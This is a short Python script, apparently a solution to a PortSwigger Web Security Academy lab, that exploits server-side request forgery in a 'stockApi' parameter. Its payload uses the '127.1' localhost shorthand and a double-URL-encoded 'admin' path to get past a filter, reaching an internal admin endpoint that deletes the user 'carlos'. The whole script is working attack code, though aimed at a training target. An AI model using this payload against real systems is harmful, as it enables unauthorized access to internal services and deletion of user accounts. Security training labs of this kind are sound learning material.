import requests
import json
import bs4
import time
url = "https://0a7a00de04c9485b8949a6a000850094.web-security-academy.net/product/stock"
data = {
            "stockApi": f"//127.1/%25%36%31dmin/delete?username=carlos"
        }
response = requests.request("POST", url, data=data)
print(response.text)